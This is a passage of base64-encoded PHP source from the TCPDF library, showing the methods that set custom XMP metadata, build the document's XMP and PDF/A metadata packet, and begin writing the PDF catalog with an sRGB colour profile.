UgYWRkZWQgb24gdGhlIGRlZmF1bHQgWE1QIGRhdGEganVzdCBiZWZvcmUgdGhlIGVuZCBvZiAieDp4bXBtZXRhIiB0YWcuCgkgKiBJTVBPUlRBTlQ6IFRoaXMgZGF0YSBpcyBhZGRlZCBhcy1pcyB3aXRob3V0IGNvbnRyb2xzLCBzbyB5b3UgaGF2ZSB0byB2YWxpZGF0ZSB5b3VyIGRhdGEgYmVmb3JlIHVzaW5nIHRoaXMgbWV0aG9kIQoJICogQHBhcmFtIHN0cmluZyAkeG1wIEN1c3RvbSBYTVAgZGF0YS4KCSAqIEBzaW5jZSA1LjkuMTI4ICgyMDExLTEwLTA2KQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0RXh0cmFYTVAoJHhtcCkgewoJCSR0aGlzLT5jdXN0b21feG1wID0gJHhtcDsKCX0KCgkvKioKCSAqIFNldCBhZGRpdGlvbmFsIFhNUCBkYXRhIHRvIGJlIGFkZGVkIG9uIHRoZSBkZWZhdWx0IFhNUCBkYXRhIGp1c3QgYmVmb3JlIHRoZSBlbmQgb2YgInJkZjpSREYiIHRhZy4KCSAqIElNUE9SVEFOVDogVGhpcyBkYXRhIGlzIGFkZGVkIGFzLWlzIHdpdGhvdXQgY29udHJvbHMsIHNvIHlvdSBoYXZlIHRvIHZhbGlkYXRlIHlvdXIgZGF0YSBiZWZvcmUgdXNpbmcgdGhpcyBtZXRob2QhCgkgKiBAcGFyYW0gc3RyaW5nICR4bXAgQ3VzdG9tIFhNUCBSREYgZGF0YS4KCSAqIEBzaW5jZSA2LjMuMCAoMjAxOS0wOS0xOSkKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEV4dHJhWE1QUkRGKCR4bXApIHsKCQkkdGhpcy0+Y3VzdG9tX3htcF9yZGYgPSAkeG1wOwoJfQoKCS8qKgoJICogUHV0IFhNUCBkYXRhIG9iamVjdCBhbmQgcmV0dXJuIElELgoJICogQHJldHVybiBpbnQgVGhlIG9iamVjdCBJRC4KCSAqIEBzaW5jZSA1LjkuMTIxICgyMDExLTA5LTI4KQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX3B1dFhNUCgpIHsKCQkkb2lkID0gJHRoaXMtPl9uZXdvYmooKTsKCQkvLyBzdG9yZSBjdXJyZW50IGlzdW5pY29kZSB2YWx1ZQoJCSRwcmV2X2lzdW5pY29kZSA9ICR0aGlzLT5pc3VuaWNvZGU7CgkJJHRoaXMtPmlzdW5pY29kZSA9IHRydWU7CgkJJHByZXZfZW5jcnlwdGVkID0gJHRoaXMtPmVuY3J5cHRlZDsKCQkkdGhpcy0+ZW5jcnlwdGVkID0gZmFsc2U7CgkJLy8gc2V0IFhNUCBkYXRhCgkJJHhtcCA9ICc8P3hwYWNrZXQgYmVnaW49IicuVENQREZfRk9OVFM6OnVuaWNocigweGZlZmYsICR0aGlzLT5pc3VuaWNvZGUpLiciIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4nLiJcbiI7CgkJJHhtcCAuPSAnPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNC4yLjEtYzA0MyA1Mi4zNzI3MjgsIDIwMDkvMDEvMTgtMTU6MDg6MDQiPicuIlxuIjsKCQkkeG1wIC49ICJcdCIuJzxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHQiLic8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHQiLic8ZGM6Zm9ybWF0PmFwcGxpY2F0aW9uL3BkZjwvZGM6Zm9ybWF0PicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHQiLic8ZGM6dGl0bGU+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0Ii4nPHJkZjpBbHQ+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHQiLic8cmRmOmxpIHhtbDpsYW5nPSJ4LWRlZmF1bHQiPicuVENQREZfU1RBVElDOjpfZXNjYXBlWE1MKCR0aGlzLT50aXRsZSkuJzwvcmRmOmxpPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdCIuJzwvcmRmOkFsdD4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPC9kYzp0aXRsZT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPGRjOmNyZWF0b3I+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0Ii4nPHJkZjpTZXE+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHQiLic8cmRmOmxpPicuVENQREZfU1RBVElDOjpfZXNjYXBlWE1MKCR0aGlzLT5hdXRob3IpLic8L3JkZjpsaT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHQiLic8L3JkZjpTZXE+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdCIuJzwvZGM6Y3JlYXRvcj4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPGRjOmRlc2NyaXB0aW9uPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdCIuJzxyZGY6QWx0PicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0Ii4nPHJkZjpsaSB4bWw6bGFuZz0ieC1kZWZhdWx0Ij4nLlRDUERGX1NUQVRJQzo6X2VzY2FwZVhNTCgkdGhpcy0+c3ViamVjdCkuJzwvcmRmOmxpPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdCIuJzwvcmRmOkFsdD4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPC9kYzpkZXNjcmlwdGlvbj4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPGRjOnN1YmplY3Q+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0Ii4nPHJkZjpCYWc+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHQiLic8cmRmOmxpPicuVENQREZfU1RBVElDOjpfZXNjYXBlWE1MKCR0aGlzLT5rZXl3b3JkcykuJzwvcmRmOmxpPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdCIuJzwvcmRmOkJhZz4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPC9kYzpzdWJqZWN0PicuIlxuIjsKCQkkeG1wIC49ICJcdFx0Ii4nPC9yZGY6RGVzY3JpcHRpb24+Jy4iXG4iOwoJCS8vIGNvbnZlcnQgZG9jIGNyZWF0aW9uIGRhdGUgZm9ybWF0CgkJJGRjZGF0ZSA9IFRDUERGX1NUQVRJQzo6Z2V0Rm9ybWF0dGVkRGF0ZSgkdGhpcy0+ZG9jX2NyZWF0aW9uX3RpbWVzdGFtcCk7CgkJJGRvY2NyZWF0aW9uZGF0ZSA9IHN1YnN0cigkZGNkYXRlLCAwLCA0KS4nLScuc3Vic3RyKCRkY2RhdGUsIDQsIDIpLictJy5zdWJzdHIoJGRjZGF0ZSwgNiwgMik7CgkJJGRvY2NyZWF0aW9uZGF0ZSAuPSAnVCcuc3Vic3RyKCRkY2RhdGUsIDgsIDIpLic6Jy5zdWJzdHIoJGRjZGF0ZSwgMTAsIDIpLic6Jy5zdWJzdHIoJGRjZGF0ZSwgMTIsIDIpOwoJCSRkb2NjcmVhdGlvbmRhdGUgLj0gc3Vic3RyKCRkY2RhdGUsIDE0LCAzKS4nOicuc3Vic3RyKCRkY2RhdGUsIDE4LCAyKTsKCQkkZG9jY3JlYXRpb25kYXRlID0gVENQREZfU1RBVElDOjpfZXNjYXBlWE1MKCRkb2NjcmVhdGlvbmRhdGUpOwoJCS8vIGNvbnZlcnQgZG9jIG1vZGlmaWNhdGlvbiBkYXRlIGZvcm1hdAoJCSRkbWRhdGUgPSBUQ1BERl9TVEFUSUM6OmdldEZvcm1hdHRlZERhdGUoJHRoaXMtPmRvY19tb2RpZmljYXRpb25fdGltZXN0YW1wKTsKCQkkZG9jbW9kZGF0ZSA9IHN1YnN0cigkZG1kYXRlLCAwLCA0KS4nLScuc3Vic3RyKCRkbWRhdGUsIDQsIDIpLictJy5zdWJzdHIoJGRtZGF0ZSwgNiwgMik7CgkJJGRvY21vZGRhdGUgLj0gJ1QnLnN1YnN0cigkZG1kYXRlLCA4LCAyKS4nOicuc3Vic3RyKCRkbWRhdGUsIDEwLCAyKS4nOicuc3Vic3RyKCRkbWRhdGUsIDEyLCAyKTsKCQkkZG9jbW9kZGF0ZSAuPSBzdWJzdHIoJGRtZGF0ZSwgMTQsIDMpLic6Jy5zdWJzdHIoJGRtZGF0ZSwgMTgsIDIpOwoJCSRkb2Ntb2RkYXRlID0gVENQREZfU1RBVElDOjpfZXNjYXBlWE1MKCRkb2Ntb2RkYXRlKTsKCQkkeG1wIC49ICJcdFx0Ii4nPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIj4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPHhtcDpDcmVhdGVEYXRlPicuJGRvY2NyZWF0aW9uZGF0ZS4nPC94bXA6Q3JlYXRlRGF0ZT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPHhtcDpDcmVhdG9yVG9vbD4nLiR0aGlzLT5jcmVhdG9yLic8L3htcDpDcmVhdG9yVG9vbD4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPHhtcDpNb2RpZnlEYXRlPicuJGRvY21vZGRhdGUuJzwveG1wOk1vZGlmeURhdGU+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdCIuJzx4bXA6TWV0YWRhdGFEYXRlPicuJGRvY2NyZWF0aW9uZGF0ZS4nPC94bXA6TWV0YWRhdGFEYXRlPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0Ii4nPC9yZGY6RGVzY3JpcHRpb24+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHQiLic8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczpwZGY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGRmLzEuMy8iPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHQiLic8cGRmOktleXdvcmRzPicuVENQREZfU1RBVElDOjpfZXNjYXBlWE1MKCR0aGlzLT5rZXl3b3JkcykuJzwvcGRmOktleXdvcmRzPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHQiLic8cGRmOlByb2R1Y2VyPicuVENQREZfU1RBVElDOjpfZXNjYXBlWE1MKFRDUERGX1NUQVRJQzo6Z2V0VENQREZQcm9kdWNlcigpKS4nPC9wZGY6UHJvZHVjZXI+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHQiLic8L3JkZjpEZXNjcmlwdGlvbj4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdCIuJzxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIj4nLiJcbiI7CgkJJHV1aWQgPSAndXVpZDonLnN1YnN0cigkdGhpcy0+ZmlsZV9pZCwgMCwgOCkuJy0nLnN1YnN0cigkdGhpcy0+ZmlsZV9pZCwgOCwgNCkuJy0nLnN1YnN0cigkdGhpcy0+ZmlsZV9pZCwgMTIsIDQpLictJy5zdWJzdHIoJHRoaXMtPmZpbGVfaWQsIDE2LCA0KS4nLScuc3Vic3RyKCR0aGlzLT5maWxlX2lkLCAyMCwgMTIpOwoJCSR4bXAgLj0gIlx0XHRcdCIuJzx4bXBNTTpEb2N1bWVudElEPicuJHV1aWQuJzwveG1wTU06RG9jdW1lbnRJRD4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPHhtcE1NOkluc3RhbmNlSUQ+Jy4kdXVpZC4nPC94bXBNTTpJbnN0YW5jZUlEPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0Ii4nPC9yZGY6RGVzY3JpcHRpb24+Jy4iXG4iOwoJCWlmICgkdGhpcy0+cGRmYV9tb2RlKSB7CgkJCSR4bXAgLj0gIlx0XHQiLic8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczpwZGZhaWQ9Imh0dHA6Ly93d3cuYWlpbS5vcmcvcGRmYS9ucy9pZC8iPicuIlxuIjsKCQkJJHhtcCAuPSAiXHRcdFx0Ii4nPHBkZmFpZDpwYXJ0PicuJHRoaXMtPnBkZmFfdmVyc2lvbi4nPC9wZGZhaWQ6cGFydD4nLiJcbiI7CgkJCSR4bXAgLj0gIlx0XHRcdCIuJzxwZGZhaWQ6Y29uZm9ybWFuY2U+QjwvcGRmYWlkOmNvbmZvcm1hbmNlPicuIlxuIjsKCQkJJHhtcCAuPSAiXHRcdCIuJzwvcmRmOkRlc2NyaXB0aW9uPicuIlxuIjsKCQl9CgkJLy8gWE1QIGV4dGVuc2lvbiBzY2hlbWFzCgkJJHhtcCAuPSAiXHRcdCIuJzxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnBkZmFFeHRlbnNpb249Imh0dHA6Ly93d3cuYWlpbS5vcmcvcGRmYS9ucy9leHRlbnNpb24vIiB4bWxuczpwZGZhU2NoZW1hPSJodHRwOi8vd3d3LmFpaW0ub3JnL3BkZmEvbnMvc2NoZW1hIyIgeG1sbnM6cGRmYVByb3BlcnR5PSJodHRwOi8vd3d3LmFpaW0ub3JnL3BkZmEvbnMvcHJvcGVydHkjIj4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0Ii4nPHBkZmFFeHRlbnNpb246c2NoZW1hcz4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHQiLic8cmRmOkJhZz4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdCIuJzxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHQiLic8cGRmYVNjaGVtYTpuYW1lc3BhY2VVUkk+aHR0cDovL25zLmFkb2JlLmNvbS9wZGYvMS4zLzwvcGRmYVNjaGVtYTpuYW1lc3BhY2VVUkk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdCIuJzxwZGZhU2NoZW1hOnByZWZpeD5wZGY8L3BkZmFTY2hlbWE6cHJlZml4PicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHQiLic8cGRmYVNjaGVtYTpzY2hlbWE+QWRvYmUgUERGIFNjaGVtYTwvcGRmYVNjaGVtYTpzY2hlbWE+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdCIuJzxwZGZhU2NoZW1hOnByb3BlcnR5PicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdCIuJzxyZGY6U2VxPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0Ii4nPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0XHRcdCIuJzxwZGZhUHJvcGVydHk6Y2F0ZWdvcnk+aW50ZXJuYWw8L3BkZmFQcm9wZXJ0eTpjYXRlZ29yeT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHRcdFx0Ii4nPHBkZmFQcm9wZXJ0eTpkZXNjcmlwdGlvbj5BZG9iZSBQREYgU2NoZW1hPC9wZGZhUHJvcGVydHk6ZGVzY3JpcHRpb24+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0XHRcdCIuJzxwZGZhUHJvcGVydHk6bmFtZT5JbnN0YW5jZUlEPC9wZGZhUHJvcGVydHk6bmFtZT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHRcdFx0Ii4nPHBkZmFQcm9wZXJ0eTp2YWx1ZVR5cGU+VVJJPC9wZGZhUHJvcGVydHk6dmFsdWVUeXBlPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0Ii4nPC9yZGY6bGk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0Ii4nPC9yZGY6U2VxPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHQiLic8L3BkZmFTY2hlbWE6cHJvcGVydHk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHQiLic8L3JkZjpsaT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdCIuJzxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHQiLic8cGRmYVNjaGVtYTpuYW1lc3BhY2VVUkk+aHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLzwvcGRmYVNjaGVtYTpuYW1lc3BhY2VVUkk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdCIuJzxwZGZhU2NoZW1hOnByZWZpeD54bXBNTTwvcGRmYVNjaGVtYTpwcmVmaXg+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdCIuJzxwZGZhU2NoZW1hOnNjaGVtYT5YTVAgTWVkaWEgTWFuYWdlbWVudCBTY2hlbWE8L3BkZmFTY2hlbWE6c2NoZW1hPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHQiLic8cGRmYVNjaGVtYTpwcm9wZXJ0eT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHQiLic8cmRmOlNlcT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHRcdCIuJzxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0XHQiLic8cGRmYVByb3BlcnR5OmNhdGVnb3J5PmludGVybmFsPC9wZGZhUHJvcGVydHk6Y2F0ZWdvcnk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0XHRcdCIuJzxwZGZhUHJvcGVydHk6ZGVzY3JpcHRpb24+VVVJRCBiYXNlZCBpZGVudGlmaWVyIGZvciBzcGVjaWZpYyBpbmNhcm5hdGlvbiBvZiBhIGRvY3VtZW50PC9wZGZhUHJvcGVydHk6ZGVzY3JpcHRpb24+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0XHRcdCIuJzxwZGZhUHJvcGVydHk6bmFtZT5JbnN0YW5jZUlEPC9wZGZhUHJvcGVydHk6bmFtZT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHRcdFx0Ii4nPHBkZmFQcm9wZXJ0eTp2YWx1ZVR5cGU+VVJJPC9wZGZhUHJvcGVydHk6dmFsdWVUeXBlPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0Ii4nPC9yZGY6bGk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0Ii4nPC9yZGY6U2VxPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHQiLic8L3BkZmFTY2hlbWE6cHJvcGVydHk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHQiLic8L3JkZjpsaT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdCIuJzxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHQiLic8cGRmYVNjaGVtYTpuYW1lc3BhY2VVUkk+aHR0cDovL3d3dy5haWltLm9yZy9wZGZhL25zL2lkLzwvcGRmYVNjaGVtYTpuYW1lc3BhY2VVUkk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdCIuJzxwZGZhU2NoZW1hOnByZWZpeD5wZGZhaWQ8L3BkZmFTY2hlbWE6cHJlZml4PicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHQiLic8cGRmYVNjaGVtYTpzY2hlbWE+UERGL0EgSUQgU2NoZW1hPC9wZGZhU2NoZW1hOnNjaGVtYT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0Ii4nPHBkZmFTY2hlbWE6cHJvcGVydHk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0Ii4nPHJkZjpTZXE+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0XHQiLic8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHRcdFx0Ii4nPHBkZmFQcm9wZXJ0eTpjYXRlZ29yeT5pbnRlcm5hbDwvcGRmYVByb3BlcnR5OmNhdGVnb3J5PicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0XHQiLic8cGRmYVByb3BlcnR5OmRlc2NyaXB0aW9uPlBhcnQgb2YgUERGL0Egc3RhbmRhcmQ8L3BkZmFQcm9wZXJ0eTpkZXNjcmlwdGlvbj4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHRcdFx0Ii4nPHBkZmFQcm9wZXJ0eTpuYW1lPnBhcnQ8L3BkZmFQcm9wZXJ0eTpuYW1lPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0XHQiLic8cGRmYVByb3BlcnR5OnZhbHVlVHlwZT5JbnRlZ2VyPC9wZGZhUHJvcGVydHk6dmFsdWVUeXBlPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0Ii4nPC9yZGY6bGk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0XHQiLic8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHRcdFx0Ii4nPHBkZmFQcm9wZXJ0eTpjYXRlZ29yeT5pbnRlcm5hbDwvcGRmYVByb3BlcnR5OmNhdGVnb3J5PicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0XHQiLic8cGRmYVByb3BlcnR5OmRlc2NyaXB0aW9uPkFtZW5kbWVudCBvZiBQREYvQSBzdGFuZGFyZDwvcGRmYVByb3BlcnR5OmRlc2NyaXB0aW9uPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0XHQiLic8cGRmYVByb3BlcnR5Om5hbWU+YW1kPC9wZGZhUHJvcGVydHk6bmFtZT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHRcdFx0Ii4nPHBkZmFQcm9wZXJ0eTp2YWx1ZVR5cGU+VGV4dDwvcGRmYVByb3BlcnR5OnZhbHVlVHlwZT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHRcdCIuJzwvcmRmOmxpPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0Ii4nPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0XHRcdCIuJzxwZGZhUHJvcGVydHk6Y2F0ZWdvcnk+aW50ZXJuYWw8L3BkZmFQcm9wZXJ0eTpjYXRlZ29yeT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHRcdFx0XHRcdFx0Ii4nPHBkZmFQcm9wZXJ0eTpkZXNjcmlwdGlvbj5Db25mb3JtYW5jZSBsZXZlbCBvZiBQREYvQSBzdGFuZGFyZDwvcGRmYVByb3BlcnR5OmRlc2NyaXB0aW9uPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0XHQiLic8cGRmYVByb3BlcnR5Om5hbWU+Y29uZm9ybWFuY2U8L3BkZmFQcm9wZXJ0eTpuYW1lPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0XHQiLic8cGRmYVByb3BlcnR5OnZhbHVlVHlwZT5UZXh0PC9wZGZhUHJvcGVydHk6dmFsdWVUeXBlPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHRcdFx0Ii4nPC9yZGY6bGk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHRcdFx0Ii4nPC9yZGY6U2VxPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0XHRcdFx0XHQiLic8L3BkZmFTY2hlbWE6cHJvcGVydHk+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdFx0XHQiLic8L3JkZjpsaT4nLiJcbiI7CgkJJHhtcCAuPSAiXHRcdFx0XHQiLic8L3JkZjpCYWc+Jy4iXG4iOwoJCSR4bXAgLj0gIlx0XHRcdCIuJzwvcGRmYUV4dGVuc2lvbjpzY2hlbWFzPicuIlxuIjsKCQkkeG1wIC49ICJcdFx0Ii4nPC9yZGY6RGVzY3JpcHRpb24+Jy4iXG4iOwoJCSR4bXAgLj0gJHRoaXMtPmN1c3RvbV94bXBfcmRmOwoJCSR4bXAgLj0gIlx0Ii4nPC9yZGY6UkRGPicuIlxuIjsKCQkkeG1wIC49ICR0aGlzLT5jdXN0b21feG1wOwoJCSR4bXAgLj0gJzwveDp4bXBtZXRhPicuIlxuIjsKCQkkeG1wIC49ICc8P3hwYWNrZXQgZW5kPSJ3Ij8+JzsKCQkkb3V0ID0gJzw8IC9UeXBlIC9NZXRhZGF0YSAvU3VidHlwZSAvWE1MIC9MZW5ndGggJy5zdHJsZW4oJHhtcCkuJyA+PiBzdHJlYW0nLiJcbiIuJHhtcC4iXG4iLidlbmRzdHJlYW0nLiJcbiIuJ2VuZG9iaic7CgkJLy8gcmVzdG9yZSBwcmV2aW91cyBpc3VuaWNvZGUgdmFsdWUKCQkkdGhpcy0+aXN1bmljb2RlID0gJHByZXZfaXN1bmljb2RlOwoJCSR0aGlzLT5lbmNyeXB0ZWQgPSAkcHJldl9lbmNyeXB0ZWQ7CgkJJHRoaXMtPl9vdXQoJG91dCk7CgkJcmV0dXJuICRvaWQ7Cgl9CgoJLyoqCgkgKiBPdXRwdXQgQ2F0YWxvZy4KCSAqIEByZXR1cm4gaW50IG9iamVjdCBpZAoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX3B1dGNhdGFsb2coKSB7CgkJLy8gcHV0IFhNUAoJCSR4bXBvYmogPSAkdGhpcy0+X3B1dFhNUCgpOwoJCS8vIGlmIHJlcXVpcmVkLCBhZGQgc3RhbmRhcmQgc1JHQiBJQ0MgY29sb3VyIHByb2ZpbGUKCQlpZiAoJHRoaXMtPnBkZmFfbW9kZSBPUiAkdGhpcy0+Zm9yY2Vfc3JnYikgewoJCQkkaWNjb2JqID0gJHRoaXMtPl9uZXdvYmooKTsKCQkJJGljYyA9IGZpbGVfZ2V0X2NvbnRlbnRzKGRpcm5hbWUoX19GSUxFX18pLicvaW5jbHVkZS9zUkdCLmljYycpOwoJCQkkZmlsdGVyID0gJyc7CgkJCWlmICgkdGhpcy0+Y29tcHJlc3MpIHsKCQkJCSRmaWx0ZXIgPSAnIC9GaWx0ZXIgL0ZsYXRlRGVjb2RlJzsKCQkJCSRpY2MgPSBnemNvbXByZXNzKCRpY2MpOwoJCQl9CgkJCSRpY2MgPSAkdGhpcy0+X2dldHJhd3N0cmVhbSgkaWNjKTsKCQkJJHRoaXMtPl9vdXQoJzw8L04gMyAnLiRmaWx0ZXIuJy9MZW5ndGggJy5zdHJsZW4oJGljYykuJz4+IHN0cmVhbScuIlxuIi4kaWNjLiJcbiIuJ2VuZHN0cmVhbScuIlxuIi4nZW5kb2JqJyk7CgkJfQoJCS8vIHN0YXJ0IGNhdGFsb2cKCQkkb2lkID0gJHRoaXMtPl9uZXdvYmooKTsKCQkkb3V0ID0gJzw8IC9UeXBlIC9DYXRhbG9nJzsKCQkkb3V0IC49ICcgL1ZlcnNpb24gLycuJHRoaXMtPlBERlZlcnNpb247CgkJLy8kb3V0IC49ICcgL0V4dGVuc2lvbnMgPDw+Pic7CgkJJG91dCAuPSAnIC9QYWdlcyAxIDAgUic7CgkJLy8kb3V0IC49ICcgL1BhZ2VMYWJlbHMgJyAvLy4uLjsKCQkkb3V0IC49ICcgL05hbWVzIDw8JzsKCQlpZiAoKCEkdGhpcy0+cGRmYV9tb2RlKSBBTkQgIWVtcHR5KCR0aGlzLT5uX2pzKSkgewoJCQkkb3V0IC49ICcgL0phdmFTY3JpcHQgJy4kdGhpcy0+bl9qczsKCQl9CgkJaWYgK